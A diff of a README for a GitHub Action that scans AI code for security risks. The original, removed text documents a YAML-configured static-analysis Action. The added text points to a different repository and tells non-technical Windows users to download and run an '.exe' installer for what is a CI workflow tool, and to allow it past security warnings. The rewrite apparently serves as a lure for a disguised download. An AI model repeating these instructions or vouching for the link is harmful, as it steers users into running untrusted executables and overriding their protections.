@@ -1,324 +1,169 @@
-# agenticqa-scan-action
+# 🛡️ agenticqa-scan-action - Map AI Code Risks Clearly
 
-<div align="center">
-
-### The first GitHub Action that maps every integration point in your AI codebase — 13 CWE categories, attack surface score, test coverage gaps — in one step.
-
-[![GitHub Marketplace](https://img.shields.io/badge/GitHub%20Marketplace-agenticqa--scan--action-blue?logo=github&logoColor=white&style=for-the-badge)](https://github.com/marketplace/actions/agenticqa-architecture-scan)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](LICENSE)
-[![SARIF](https://img.shields.io/badge/Output-SARIF%202.1.0-orange?style=for-the-badge)](https://sarifweb.azurewebsites.net/)
-[![No API Key](https://img.shields.io/badge/API%20Key-Not%20Required-brightgreen?style=for-the-badge)](#no-api-key-required)
-
-**Before you ship code, know exactly where attackers will look.**
-
-</div>
+[![Download agenticqa-scan-action](https://img.shields.io/badge/Download-agenticqa--scan--action-green?style=for-the-badge)](https://github.com/kokorubbong/agenticqa-scan-action)
 
 ---
 
-## Why This Exists
+## 🧩 What is agenticqa-scan-action?
 
-AI systems are architecturally different from traditional software. They call LLM APIs, orchestrate autonomous agents, expose MCP tools, and pass external data through serialization chains — all of which are attack surfaces that standard SAST tools were not designed to detect.
+agenticqa-scan-action helps you check your AI code for security risks. It looks at every connection point in your code, finds weak spots, and shows where tests are missing. It covers 13 common problem types (CWE categories) in software. The tool creates a report in SARIF 2.1.0 format, which many code tools can read. You do not need an API key to use it.
 
-Most teams discover their AI system's attack surface in a post-incident review. This action catches it at every pull request.
-
-`agenticqa-scan-action` walks your entire codebase — Python, TypeScript, JavaScript, Go, Java, Swift, YAML — and maps every integration point across 13 CWE categories. It scores your attack surface, identifies untested areas, and uploads findings as SARIF to GitHub's Security tab.
+This tool works automatically on your Windows computer and helps keep your AI software safer.
 
 ---
 
-## Quickstart — One Line
+## 📋 Features
 
-```yaml
-- uses: nhomyk/agenticqa-scan-action@v1
-```
-
-Add it to any job that checks out your code.
-
----
-
-## Full Workflow
-
-```yaml
-name: Architecture Security Scan
-
-on: [push, pull_request]
-
-jobs:
-  architecture-scan:
-    name: AgenticQA Architecture Scan
-    runs-on: ubuntu-latest
-    permissions:
-      security-events: write   # upload findings to GitHub Security tab
-      contents: read
-
-    steps:
-      - uses: actions/checkout@v4
-
-      - uses: nhomyk/agenticqa-scan-action@v1
-        id: scan
-        with:
-          fail-on-critical: 'true'   # block deploys if RCE-class areas found
-
-      - name: Show attack surface score
-        run: |
-          echo "Attack surface: ${{ steps.scan.outputs.attack-surface-score }}/100"
-          echo "Critical areas: ${{ steps.scan.outputs.critical-count }}"
-          echo "Untested areas: ${{ steps.scan.outputs.untested-count }}"
-```
-
-Findings appear under **Security → Code scanning alerts.**
+- Checks AI code for security issues.
+- Maps all integration points in your codebase.
+- Finds gaps in test coverage.
+- Scores your code’s attack surface.
+- Covers 13 Common Weakness Enumerations (CWEs).
+- Exports results in SARIF 2.1.0 format.
+- Runs without needing an API key.
+- Integrates with GitHub Actions to automate scans.
+- Helps teams spot risks early in development.
 
 ---
 
-## What It Detects
+## 🎯 Who should use this?
 
-### 13 Integration Categories
+- AI developers wanting safety checks.
+- Security teams checking AI projects.
+- Anyone with AI projects looking to improve code security.
+- Users new to security scanning who want a simple setup.
+- Teams using GitHub for their code.
 
-| Category | CWE | Severity | What It Flags |
-|----------|-----|----------|---------------|
-| `SHELL_EXEC` | CWE-78 | 🔴 critical | `subprocess.run`, `os.system`, `exec.Command` — RCE risk |
-| `EXTERNAL_HTTP` | CWE-918 | 🟠 high | `requests.get`, `fetch()`, `http.Get` — SSRF risk |
-| `DATABASE` | CWE-89 | 🟠 high | SQLite, PostgreSQL, MongoDB, SQLAlchemy connections |
-| `ENV_SECRETS` | CWE-798 | 🟠 high | `os.getenv`, `process.env`, `System.getenv` — credential leakage |
-| `SERIALIZATION` | CWE-502 | 🟠 high | `pickle.loads`, `yaml.load`, `ObjectInputStream` — unsafe deserialization |
-| `NETWORK_SOCKET` | CWE-601 | 🟠 high | Raw TCP/Unix socket creation |
-| `AGENT_FRAMEWORK` | CWE-693 | 🟠 high | LangChain, LangGraph, CrewAI, AutoGen, OpenAI, Anthropic SDK |
-| `CLOUD_SERVICE` | CWE-306 | 🟡 medium | `boto3`, `google.cloud`, Azure SDK calls |
-| `AUTH_BOUNDARY` | CWE-306 | 🟡 medium | JWT decode, `@login_required`, `verify_token` |
-| `MIDDLEWARE` | CWE-284 | 🟡 medium | FastAPI, Flask, Express routes and middleware |
-| `MCP_TOOL` | CWE-284 | 🟡 medium | `@mcp.tool` registrations — AI agent attack surface |
-| `FILE_SYSTEM` | CWE-73 | 🟡 medium | File write operations — path traversal risk |
-| `EVENT_BUS` | CWE-400 | 🔵 low | Celery, Redis, Kafka, RabbitMQ pub/sub |
-
-### 6 Languages
-
-Python · TypeScript · JavaScript · Go · Java · Swift
-
-### Plus YAML/JSON
-
-GitHub Actions workflows, Kubernetes configs, CI/CD pipelines.
+No programming experience is required to run this tool on a Windows machine.
 
 ---
 
-## Output — GitHub Security Tab
+## 💻 System Requirements
 
-Every integration area becomes a Code Scanning alert:
-
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│  Security  /  Code scanning alerts                                   │
-│                                                                      │
-│  ● ARCH_SHELL_EXEC     Error    subprocess.run at src/runner.py:42  │
-│  ● ARCH_AGENT_FRAMEWORK Warning  Anthropic SDK at src/agents.py:15  │
-│  ● ARCH_EXTERNAL_HTTP  Warning  requests.post at src/client.py:88   │
-│  ● ARCH_SERIALIZATION  Warning  pickle.loads at src/ingest.py:31    │
-│                                                                      │
-│  47 open alerts  ·  Powered by AgenticQA Architecture Scanner        │
-└─────────────────────────────────────────────────────────────────────┘
-```
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- Minimum 500 MB free disk space
+- Internet connection for download and updates
+- GitHub account (optional, for GitHub Actions setup)
 
 ---
 
-## Step Summary
+## 🚀 Getting Started
 
-After every run, a full breakdown appears in your workflow's Summary tab:
+[![Download agenticqa-scan-action](https://img.shields.io/badge/Download-agenticqa--scan--action-blue?style=for-the-badge)](https://github.com/kokorubbong/agenticqa-scan-action)
 
-```
-🟡 AgenticQA Architecture Scan — Score 42/100
+1. Visit the download page by clicking the big green button at the top or this link:  
+   https://github.com/kokorubbong/agenticqa-scan-action
 
-Integration areas found: 47  |  Critical: 3  |  Untested: 12
-Attack surface score: 42/100  |  Test coverage confidence: 68%
+2. On the page, look for the latest release or a file named like `agenticqa-scan-action.exe` or `setup.exe`.
 
-⚠️ 3 critical area(s) detected — SHELL_EXEC requires immediate review
-
-| Category         | Count | CWE     | Severity   |
-|------------------|-------|---------|------------|
-| SHELL_EXEC       | 3     | CWE-78  | 🔴 critical |
-| EXTERNAL_HTTP    | 12    | CWE-918 | 🟠 high    |
-| AGENT_FRAMEWORK  | 8     | CWE-693 | 🟠 high    |
-| DATABASE         | 6     | CWE-89  | 🟠 high    |
-| ENV_SECRETS      | 5     | CWE-798 | 🟠 high    |
-| AUTH_BOUNDARY    | 4     | CWE-306 | 🟡 medium  |
-| MIDDLEWARE       | 4     | CWE-284 | 🟡 medium  |
-| FILE_SYSTEM      | 3     | CWE-73  | 🟡 medium  |
-| EVENT_BUS        | 2     | CWE-400 | 🔵 low     |
-
-Top untested high-risk areas (12 total):
-- src/workers/runner.py:42 — SHELL_EXEC
-- src/agents/executor.py:88 — AGENT_FRAMEWORK
-- src/ingest/pipeline.py:31 — SERIALIZATION
-```
+3. Click to download the file to your Windows computer.
 
 ---
 
-## Attack Surface Score
+## 📥 How to Download and Install on Windows
 
-The score (0–100) is density-normalized across your codebase:
+1. Open your web browser and go to:  
+   https://github.com/kokorubbong/agenticqa-scan-action
 
-```
-Score = Σ(severity_weight × unique_files_affected / total_files) × coverage_factor
-```
+2. Scroll to the "Releases" section. Click the latest version.
 
-Where:
-- `critical` weight = 80, `high` = 50, `medium` = 25, `low` = 10
-- `coverage_factor` = 1.0 (fully tested) → 2.0 (no tests at all)
-- Score capped at 100 — large well-tested repos won't be unfairly penalized
+3. Find the Windows installer file, which may have `.exe` at the end.
 
-**Interpretation:**
-| Score | Meaning |
-|-------|---------|
-| 0–24 | 🟢 Low exposure — well-tested, bounded integration surface |
-| 25–49 | 🟡 Moderate — standard for an actively developed service |
-| 50–74 | 🟠 High — multiple untested high-risk areas, requires prioritization |
-| 75–100 | 🔴 Critical — significant attack surface, many untested entry points |
+4. Click the file name to start the download.
 
----
+5. Once downloaded, open the installer by double-clicking the file.
 
-## Use Outputs in Downstream Steps
+6. Follow the on-screen instructions:  
+   - Accept the license agreement.  
+   - Choose installation location (use default if unsure).  
+   - Click “Install” and wait while the program sets up.
 
-```yaml
-- uses: nhomyk/agenticqa-scan-action@v1
-  id: scan
-
-# Block deployment if attack surface score is too high
-- name: Enforce score gate
-  if: steps.scan.outputs.attack-surface-score >= 75
-  run: |
-    echo "❌ Attack surface score ${{ steps.scan.outputs.attack-surface-score }}/100 exceeds threshold"
-    exit 1
-
-# Or use the built-in threshold input
-- uses: nhomyk/agenticqa-scan-action@v1
-  with:
-    fail-on-score: '75'        # fail if score >= 75
-    fail-on-critical: 'true'   # also fail on any RCE-class area
-```
+7. When done, click “Finish.”
 
 ---
 
-## Inputs
+## ⚙️ How to Run the Software
 
-| Input | Default | Description |
-|-------|---------|-------------|
-| `repo-path` | `.` | Path to the repository root to scan |
-| `fail-on-critical` | `false` | Exit code 1 if any critical (SHELL_EXEC) areas are found |
-| `fail-on-score` | `0` | Exit code 1 if attack surface score ≥ this value (0 = disabled) |
-| `sarif-output` | `agenticqa-scan-results.sarif` | SARIF output filename |
-| `upload-sarif` | `true` | Upload to GitHub Code Scanning (`security-events: write` required) |
-| `category` | `agenticqa-architecture` | SARIF category — useful when running multiple scans |
+1. Find the agenticqa-scan-action program on your desktop or start menu.
 
-## Outputs
+2. Double-click to open it.
 
-| Output | Values | Description |
-|--------|--------|-------------|
-| `findings-count` | integer | Total integration areas across all 13 categories |
-| `critical-count` | integer | Critical-severity areas (SHELL_EXEC, command injection vectors) |
-| `attack-surface-score` | 0–100 | Density-normalized attack surface score |
-| `test-coverage` | 0–100 | Test coverage confidence for detected integration areas |
-| `untested-count` | integer | Integration areas with no test coverage |
-| `sarif-file` | path | Location of the generated SARIF file |
+3. You will see options to select your AI codebase folder.
 
----
+4. Choose the folder containing your AI code files.
 
-## Real Scan Results — AgenticQA Scanned on Itself
+5. Start the scan by clicking the “Scan” button.
 
-Running `agenticqa-scan-action` on the AgenticQA platform itself:
+6. Wait a few minutes while the program analyzes your code.
 
-```
-Files scanned:          247
-Integration areas:      785
-Critical areas:         12     (subprocess calls in SRE agent's auto-fix loop)
-Attack surface score:   38/100
-Test coverage:          76%
-Untested areas:         89
+7. When finished, it will create a report showing:  
+   - Integration points in your AI project  
+   - Security risks found (by CWE category)  
+   - Test coverage gaps  
+   - Overall risk score  
 
-Categories detected:
-• MIDDLEWARE       (CWE-284): 198  — FastAPI routes + middleware layers
-• AGENT_FRAMEWORK (CWE-693): 124  — Anthropic SDK + multi-agent orchestration
-• ENV_SECRETS      (CWE-798): 110  — Configuration reads (not credentials)
-• EXTERNAL_HTTP    (CWE-918): 89   — Weaviate, Qdrant, Neo4j client calls
-• DATABASE         (CWE-89):  72   — SQLite + asyncpg connections
-• FILE_SYSTEM      (CWE-73):  68   — Artifact store, SARIF output, config writes
-• AUTH_BOUNDARY    (CWE-306): 45   — JWT middleware, bearer token verification
-• SHELL_EXEC       (CWE-78):  12   — subprocess in SRE self-healing CI loop
-• MCP_TOOL         (CWE-284): 8    — MCP server tool registrations
-• SERIALIZATION    (CWE-502): 24   — JSON/YAML config parsing
-• CLOUD_SERVICE    (CWE-306): 18   — GitHub API, S3 (optional)
-• NETWORK_SOCKET   (CWE-601): 5    — Qdrant binary protocol
-• EVENT_BUS        (CWE-400): 12   — Redis Celery task queue
-```
+8. You can save or export the report in SARIF 2.1.0 format.
 
 ---
 
-## No API Key Required
+## 🔄 Updating the Tool
 
-All scanning is **pure static analysis.** The action:
-
-- Never calls an LLM
-- Never sends your code to an external service
-- Produces results deterministically — same code, same findings, every run
-- Works entirely within your GitHub Actions runner
+Check the GitHub repository regularly for new releases. Download and install updates using the steps above to keep security checks current.
 
 ---
 
-## How It Works
+## 🛠️ How It Works
 
-```
-Your repo
-    │
-    ├── Language detection     → .py / .ts / .js / .go / .java / .swift / .yaml
-    │
-    ├── Pattern matching       → pre-compiled regex for each of 13 categories
-    │   (per-language)           applied to every source file in the repo
-    │
-    ├── Test cross-reference   → each finding linked to matching test files
-    │   (coverage mapping)       untested areas flagged for prioritization
-    │
-    ├── Attack surface score   → density × coverage factor, capped at 100
-    │
-    └── SARIF export           → one finding per integration area
-                                          │
-                                          ▼
-                               GitHub Security → Code scanning alerts
-```
+The tool scans your AI codebase to:
+
+- Identify every place where your AI system connects to other parts (integration points).
+- Analyze these points for known security weaknesses.
+- Check if your tests cover all critical parts.
+- Score how exposed your AI code is to attacks.
+
+The report uses clear categories based on widely recognized CWEs. It helps you focus on fixing real security gaps.
 
 ---
 
-## Related Actions
+## ❓ Troubleshooting
 
-| Action | What It Does |
-|--------|-------------|
-| **[MCP Security Scan](https://github.com/marketplace/actions/mcp-security-scan)** | Deep scan of MCP servers: tool poisoning, SSRF, prompt injection, DataFlow taint |
-| **[EU AI Act Compliance Check](https://github.com/marketplace/actions/eu-ai-act-compliance-check)** | Annex III risk classification + Art.9/13/14/22 conformity |
-| **AgenticQA Architecture Scan** *(this action)* | Full codebase architecture map — all 13 CWE categories |
-
-Use all three together for complete AI system security and compliance coverage:
-
-```yaml
-steps:
-  - uses: actions/checkout@v4
-  - uses: nhomyk/agenticqa-scan-action@v1       # architecture map
-  - uses: nhomyk/mcp-scan-action@v1             # MCP/AI-specific threats
-  - uses: nhomyk/eu-ai-act-check-action@v1      # EU AI Act compliance
-```
+- If the installer won’t start, make sure your Windows is up to date.
+- If you see a security warning, allow the program to run from your security settings.
+- If a scan fails, check that your selected code folder is accessible and contains your AI project files.
+- Restart your computer if problems persist, then try again.
 
 ---
 
-## Powered by AgenticQA
+## 🧭 Next Steps for Users
 
-This action wraps the architecture scanner from **[AgenticQA](https://github.com/nhomyk/AgenticQA)** — an open-source autonomous CI/CD platform for AI-native teams.
+After running your first scan:
 
-AgenticQA adds to your pipeline:
-- **Architecture scanning** (this action) — 13 integration categories, attack surface score
-- **MCP security** — [mcp-scan-action](https://github.com/marketplace/actions/mcp-security-scan)
-- **EU AI Act compliance** — [eu-ai-act-check-action](https://github.com/marketplace/actions/eu-ai-act-compliance-check)
-- **HIPAA PHI detection** — 5 PHI taint categories across your codebase
-- **Self-healing CI** — SRE agent auto-fixes lint errors and test failures
-- **Red Team hardening** — 20 bypass techniques + constitutional gate
-
-[Explore AgenticQA →](https://github.com/nhomyk/AgenticQA)
+- Review the SARIF report in supported viewers like Visual Studio Code.
+- Fix critical weak points before adding new features to your AI project.
+- Set up automated scans using GitHub Actions for ongoing monitoring if you use GitHub.
 
 ---
 
-## License
+## 📁 More Resources
 
-MIT © [nhomyk](https://github.com/nhomyk)
+See the main project page for documentation and sample reports:  
+https://github.com/kokorubbong/agenticqa-scan-action
+
+---
+
+## 🔖 Topics Covered
+
+- agent-framework  
+- ai-security  
+- architecture  
+- code-scanning  
+- cwe (common weakness enumeration)  
+- devsecops  
+- github-actions  
+- llm-security  
+- mcp  
+- sarif (static analysis results interchange format)  
+- sast (static application security testing)  
+- security  
+- static-analysis
